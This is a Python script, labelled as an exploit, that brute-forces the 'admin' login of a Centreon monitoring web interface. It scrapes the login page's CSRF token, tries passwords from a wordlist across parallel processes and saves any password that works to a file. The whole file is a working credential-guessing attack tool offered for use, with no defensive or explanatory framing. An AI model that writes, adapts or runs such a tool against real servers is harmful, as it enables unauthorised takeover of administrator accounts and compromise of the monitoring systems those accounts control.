#!/usr/bin/python3

"""
Exploit Created by d3afh3av3n
"""

import requests
import sys
import argparse
import warnings
from bs4 import BeautifulSoup as bs
from colorama import Fore
from functools import partial
from multiprocessing import Pool

# To turn off beautiful soup user warning
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


def bruteforce_centreon(url, output_f, password):
    """
    :param url
    :param output_f: output file
    :param password: password which is use to bruteforce
    """
    password = password.strip()
    request = requests.session()
    page = request.get(url+"/index.php")
    html_content = page.text
    soup = bs(html_content, "html5lib")
    token = soup.findAll('input')[3].get("value")
    login_info = {
        "useralias": "admin",
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    try:
        login_request = request.post(url+"/index.php", login_info)
        response_text = login_request.text
        if "Your credentials are incorrect." in response_text or "Forbidden" in response_text:
            print(Fore.RED + "Username : " + str(login_info["useralias"]) + " and password :" + str(login_info["password"]))
        else:
            print(Fore.GREEN + "Username : " + str(login_info["useralias"]) + " and password : " + str(login_info["password"]))
            try:
                with open(output_f, 'a') as f:
                    f.write(''.join([password, '\n']))
            except Exception as e:
                print(Fore.RED + e)
            sys.exit(0)
    except (requests.Timeout, requests.ConnectionError, requests.HTTPError) as err:
        print(Fore.RED + err)
        return

def read_file(filename):
    """
    It will read the file and return the content.
    :param filename: name of the file
    """
    with open(filename,'rb') as f:
        return f.readlines()


def main():
    """
    pass 2 arguments url and password list.
    :return:
    """
    # Argument Parsing
    parser = argparse.ArgumentParser(usage='%(prog)s -u url -pf password_file')
    parser.add_argument('-u', '--url',help='url')
    parser.add_argument('-o','--outputfile', default='output.txt', help='output file')
    parser.add_argument('-pf', '--password_file', help='password file')
    parser.add_argument('-t', '--threads', default=20, help='threads')
    args = parser.parse_args()

    url = args.url
    password_file = args.password_file
    output_f = args.outputfile

    try:
        max_processes = int(args.threads)
    except ValueError as err:
        sys.exit(err)

    try:
        passwords = read_file(password_file)
    except FileNotFoundError as err:
        sys.exit(err)

    fun = partial(bruteforce_centreon, url, output_f)
    with Pool(processes=max_processes) as pool:
        pool.map(fun, passwords)
    print('Finished')

if __name__ == '__main__':
    main()





